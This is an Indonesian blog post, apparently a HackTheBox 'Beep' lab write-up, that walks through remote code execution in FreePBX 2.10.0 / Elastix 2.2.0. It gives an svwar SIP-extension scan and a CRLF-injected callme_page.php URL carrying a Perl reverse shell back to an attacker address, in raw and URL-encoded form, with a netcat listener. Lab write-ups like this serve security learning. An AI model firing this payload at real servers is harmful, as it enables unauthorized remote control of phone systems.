---
featured_image: "/uploads/justakazh/2023-01-02_11-58.png"
author_description: Aku nulis karena aku pelupa
author_avatar: "/uploads/justakazh/1656477958868.jpeg"
author_facebook: https://facebook.com
author_twitter: https://twitter.com
author_instagram: https://instagram.com
author_donation: paypal / saweria / buymecoffe / etc
author_web: https://blog.hackstreet.id
title: 'FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution '
date: 2023-01-02T00:00:00.000+07:00
author: Justakazh
tags:
- pentesting
- rce
- exploit
categories: Penetration Testing

---
## Introduction

pada kesempatan kali ini saya akan membahas mengenai Vulnerability pada Elastix versi 2.2.0, tulisan ini merupakan lanjutan dari Writeup HackTheBox pada mesin Beep. goal pada tulisan ini adalah kita dapat mengetahui bagaimana cara untuk melakukan exploitasi pada kerentanan tersebut.

> **Sekilas tentang FreePBX dan** **Elastix**
>
> **FreePBX** adalah Asterisk (perangkat lunak telepon) berbasis web interface dan alat lainnya. instalasi yang pada FreePBX menggunakan IP Public.
>
> menurut wikipedia **Elastix** adalah perangkat lunak server komunikasi terpadu yang menyatukan fungsi IP PBX, email, IM, faks, dan kolaborasi. Ini memiliki antarmuka Web dan mencakup kemampuan seperti perangkat lunak pusat panggilan dengan panggilan prediktif. singkatnya Elastix merupakan software yang digunakan untuk VoIP.

## Mencari Extension Line

untuk melakukan exploitasi pada kerentanan ini, kita harus mengetahui terlebih dahulu nomor extension line yang terdapat pada PABX/PBX. disini saya akan menggunakan `svwar` [https://www.kali.org/tools/sipvicious/](https://www.kali.org/tools/sipvicious/ "https://www.kali.org/tools/sipvicious/") untuk mendapatkan nomor extension line tersebut dengan mengetikan perintah 

    svwar -m INVITE -e0-500 10.10.10.7 2>/dev/null | grep "reqauth"

![](/uploads/justakazh/2023-01-02_14-30.png)

dapat dilihat pada gambar diatas ditunjukan bahwa kita  menemukan nomor extension line tersebut, selanjutnya mari kita melakukan Remote Code Execution.

## Remote Code Execution

dari exploit yang saya temukan pada exploit-db [https://www.exploit-db.com/exploits/18650](https://www.exploit-db.com/exploits/18650 "https://www.exploit-db.com/exploits/18650") menunjukan bahwa payload yang digunakan untuk melakukan reverse shell seperti berikut

    https://beep.htb/recordings/misc/callme_page.php?action=c&callmenum=[NUMBER EXTENSION LINE]@from-internal/n
    Application: system
    Data: perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[LHOST]:[LPORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
    
    ## URL ENCODE
    https://beep.htb/recordings/misc/callme_page.php?action=c&callmenum=[NUMBER EXTENSION LINE]@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22[IP]%3a[PORT]%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A

sebelum kita menjalankan payload tersebut kita dapat membuat sebuah listener dengan menggunakan netcat

    nc -lnvp [PORT]

setelah membuat listener selanjutnya kita dapat mengakses payload tersebut melalui URL pada browser untuk mentrigger payload yang digunakan.

    https://beep.htb/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.2%3a4242%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A

![](/uploads/justakazh/2023-01-02_14-43.png)

![](/uploads/justakazh/2023-01-02_14-44.png)

dapat dilihat pada gambar diatas tersebut payload tersebut berhasil tereksekusi dengan baik dan kita berhasil mendapatkan akses tersebut.